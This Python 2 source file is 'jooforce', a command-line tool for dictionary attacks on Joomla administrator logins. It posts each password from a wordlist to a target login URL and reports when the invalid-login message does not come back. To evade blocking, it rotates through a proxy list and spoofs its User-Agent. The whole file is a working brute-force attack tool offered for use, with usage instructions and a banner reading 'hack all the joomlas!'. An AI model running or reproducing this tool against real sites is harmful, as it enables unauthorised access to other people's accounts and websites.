#
#    Copyright intninety 2012
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
import random
import sys
import urllib
import urllib2

INVALID_LOGIN_CONST = "Use a valid username and password to gain access"


class ProxyList:
    """Provides access to a list of proxies"""
    file_path = ""
    proxies = []
    current_index = 0
    
    def __init__(self, file_path):
        self.file_path = file_path
        self.parse()
        
    def parse(self):
        try:
            with open(self.file_path, "r") as f:
                data = (f.readlines())
                for line in data:
                    if (not ":" in line):
                        line = line.rstrip() + ':80'                    
                    self.proxies.append(line.rstrip())
        except IOError:
               print("  [!] The proxy list could not be opened. Check the path and try again.")
                       
    def get_random_proxy(self):
        proxy_count = len(self.proxies)
        index = random.randint(0, proxy_count - 1)
        return self.proxies[index]

    def get_next_proxy(self):
        if (self.current_index < (len(self.proxies) - 1)):
            self.current_index += 1
        else:
            self.current_index = 0;
        return self.proxies[self.current_index]

            
class HttpPostRequest:
    """A class that posts data to a URL via HTTP"""
    url = ""
    headers = ""
    post_data = ""
    proxy_list = None
    proxy_address = None
    
    def __init__(self, url = "", headers = {}, post_data = {}):
        self.url = url
        self.headers = headers
        self.post_data = post_data

    def add_header(self, key, value):
        self.headers[key] = value

    def add_post_field(self, key, value):
        self.post_data[key] = value

    def get_response(self):
        data = urllib.urlencode(self.post_data)
        request = urllib2.Request(self.url, data, self.headers)
        response_body = ""

        try:
            if (self.proxy_address != None):
                urllib2.install_opener(
                    urllib2.build_opener(
                        urllib2.ProxyHandler({'http': self.proxy_address})
                        )
                    )

            response = urllib2.urlopen(request)
            response_body = response.read()
        except:
            if (isinstance(self.proxy_list, ProxyList)):
                self.proxy_address = self.proxy_list.get_next_proxy()
                if (self.proxy_list.current_index == 0):
                    print "  [!] WARNING: The proxy list has been exhausted."
                    print "               Do you want to revert to no-proxy mode? [yes/no]"
                    user_response = raw_input("            --> ")

                    if (user_response.strip().startswith("y")):
                        self.proxy_list = None
                        self.proxy_address = None
                        return self.get_response()
                    else:
                        return self.get_response()
                else:
                    print "  [+] Switching proxy to {0}...".format(self.proxy_address)
                    return self.get_response()
            else:
                print "  [!] WARNING: An error occurred when posting to the page."
                print "               Further requests may lead to false positives."
                print "               Do you want to continue? [yes/no]"
                user_response = raw_input("            --> ")
            
                if (user_response.strip().startswith("y")):
                    response_body = INVALID_LOGIN_CONST
                else:
                    response_body = None    
        return response_body


class JooForce:
    """A class to provide the brute forcing functionality"""
    path = ""
    username = ""
    user_agent = ""
    verbose = False
    request = HttpPostRequest()

    def __init__(self, path, url, username = None, user_agent = None):
        self.path = path
        self.request.url = url
        if (username == None):
            self.username = "admin"
        else:
            self.username = username
        if ((user_agent == None) or (user_agent.strip() == "")):
            self.user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
        else:
            self.user_agent = user_agent
        self.request.add_header("User-Agent", self.user_agent)

    def start(self):
        print "  [+] Starting dictionary attack..."
        try:
            with open(self.path) as f:
                for line in f:
                    password = line.rstrip()
                    
                    if (self.verbose):
                        print "  [-] Trying {0}:{1}".format(self.username, password)
                        
                    values = {'username' : self.username, 'passwd' : password}
                    self.request.post_data = values
                    response = self.request.get_response()

                    if (response == None):
                        print "  [-] Operation cancelled!"
                        print ""
                        return
                    else:
                        if not INVALID_LOGIN_CONST in response:
                            print ""
                            print "  --------------------------------"
                            print ""
                            print "  [+] Login found!"
                            print "  [-] Password is: " + password
                            print ""
                            return    
        except (IOError) as e:
            print ""
            print "  [!] The dictionary could not be opened. Check the path and try again."
            print ""
        

print('')
print('')
print('     d8b                    .d888                                 ')
print('     Y8P                   d88P"                                  ')
print('                           888                                    ')
print('    8888  .d88b.   .d88b.  888888 .d88b.  888d888 .d8888b .d88b.  ')
print('    "888 d88""88b d88""88b 888   d88""88b 888P"  d88P"   d8P  Y8b ')
print('     888 888  888 888  888 888   888  888 888    888     88888888 ')
print('     888 Y88..88P Y88..88P 888   Y88..88P 888    Y88b.   Y8b.     ')
print('     888  "Y88P"   "Y88P"  888    "Y88P"  888     "Y8888P "Y8888  ')
print('     888 -------------------------------------------------------- ')
print('    d88P                                    hack all the joomlas! ')
print('  888P"                                                           ')
print('')
print('')
print('  [-] Usage: python jooforce.py --url example.com --user admin --dic foo.txt')
print('      ----------------------------------------------------------------------')
print('      --agent <agent>  : the user-agent string to post                     ')
print('      --dic <path>      : the password dictionary to brute force with       ')
print('      -h                : display this information                          ')
print('      --proxies <path>  : the list of proxies to alternate between          ')
#print('      -r                : randomise proxy selection                         ')
print('      --url <url>       : the URL of the Joomla login page                  ')
print('      --user <user>     : the username to attempt to login as               ')
print('      -v                : enable verbose output                             ')
print('')
print('')

verbose_mode = False
random_proxy_selection = False
dictionary_path = None
proxy_path = None
url = None
user = None
user_agent = None

arg_index = 0
for arg in sys.argv:
    if (arg == "-v" or arg == "-V"):
        verbose_mode = True
    elif (arg == "-h"):
        sys.exit(0)
    elif (arg == "--dic"):
        dictionary_path = sys.argv[arg_index + 1]
    elif (arg == "--url"):
        url = sys.argv[arg_index + 1]
    elif (arg == "--user"):
        user = sys.argv[arg_index + 1]
    elif (arg == "--useragent"):
        user_agent = sys.argv[arg_index + 1]
    elif (arg=="--proxies"):
        proxy_path = sys.argv[arg_index +1]
    elif (arg=="-r"):
        random_proxy_selection = True
    arg_index = arg_index + 1

errors = []
if (dictionary_path == None):
    errors.append("  [-] No dictionary path specified.")
if (url == None):
    errors.append("  [-] No URL specified.")
if (user == None):
    errors.append("  [-] No username specified.")
if (len(errors) > 0):
    print "  [!] One or more required parameters are missing (see below)."
    for error in errors:
        print error
    print ""
else:
    o = JooForce(dictionary_path, url, user)
    o.verbose = verbose_mode
    if (proxy_path != None):
        o.request.proxy_list = ProxyList(proxy_path)
        print "  [+] Setting proxy to {0}...".format(o.request.proxy_list.proxies[0])
        o.request.proxy_address = o.request.proxy_list.proxies[0]
    if (user_agent != None):
        o.user_agent = user_agent
    o.start()
